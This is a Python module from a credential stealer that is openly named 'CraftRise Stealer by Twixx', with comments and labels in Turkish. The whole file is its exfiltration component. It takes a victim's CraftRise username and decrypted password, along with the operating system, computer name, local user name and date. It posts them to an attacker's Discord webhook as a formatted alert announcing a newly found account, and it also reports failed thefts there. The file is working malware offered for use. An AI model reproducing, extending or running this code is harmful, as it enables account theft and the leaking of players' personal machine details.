import requests
from .decryptor import get_system_info
import json

def send_webhook(webhook_url, data):
    try:
        system_info = get_system_info()
        
        if data["success"] and data["config_found"]:
            config = data["data"]
            
            embed = {
                "title": "CraftRise Hesap Bilgileri",
                "color": 0x00ff00,
                "image": {
                    "url": "https://cdn.discordapp.com/banners/1205473233680343040/a_942183765b77874e60790f96637758e5.gif?size=480"
                },
                "fields": [
                    {
                        "name": "Kullanıcı Adı",
                        "value": f"`{config['username'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "Şifre",
                        "value": f"`{config['decrypted_password'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "Sürüm",
                        "value": f"`{config['version'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "RAM",
                        "value": f"`{config['client_ram'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "İşletim Sistemi",
                        "value": f"`{system_info['os']}`",
                        "inline": True
                    },
                    {
                        "name": "Bilgisayar Adı",
                        "value": f"`{system_info['computer_name']}`",
                        "inline": True
                    },
                    {
                        "name": "Kullanıcı",
                        "value": f"`{system_info['username']}`",
                        "inline": True
                    },
                    {
                        "name": "Tarih",
                        "value": f"`{system_info['date']}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "CraftRise Stealer by Twixx"
                }
            }
            
            extra_fields = []
            if config.get("display"):
                extra_fields.append({
                    "name": "Ekran",
                    "value": f"`{config['display']}`",
                    "inline": True
                })
            
            if "is_optimized_config" in config:
                extra_fields.append({
                    "name": "Optimize Edilmiş",
                    "value": f"`{'Evet' if config['is_optimized_config'] else 'Hayır'}`",
                    "inline": True
                })
                
            if extra_fields:
                embed["fields"].extend(extra_fields)
            
            payload = {
                "username": "CraftRise Stealer",
                "avatar_url": "https://cdn.discordapp.com/avatars/1205473233680343040/de3bf6523368126e6947a31afac0428b.png",
                "content": "**Yeni CraftRise hesabı bulundu!**",
                "embeds": [embed]
            }
            
            response = requests.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                return True
            else:
                return False
        else:
            embed = {
                "title": "CraftRise Bilgileri Alınamadı",
                "color": 0xff0000,
                "description": data["error"] or "Bilinmeyen bir hata oluştu",
                "image": {
                    "url": "https://cdn.discordapp.com/banners/1205473233680343040/a_942183765b77874e60790f96637758e5.gif?size=480"
                },
                "fields": [
                    {
                        "name": "İşletim Sistemi",
                        "value": f"`{system_info['os']}`",
                        "inline": True
                    },
                    {
                        "name": "Bilgisayar Adı",
                        "value": f"`{system_info['computer_name']}`",
                        "inline": True
                    },
                    {
                        "name": "Tarih",
                        "value": f"`{system_info['date']}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "CraftRise Stealer - Hata"
                }
            }
            
            payload = {
                "username": "CraftRise Stealer",
                "avatar_url": "https://cdn.discordapp.com/avatars/1205473233680343040/de3bf6523368126e6947a31afac0428b.png",
                "content": "**CraftRise bilgileri alınamadı**",
                "embeds": [embed]
            }
            
            response = requests.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                return True
            else:
                return False
    
    except Exception as e:
        return False 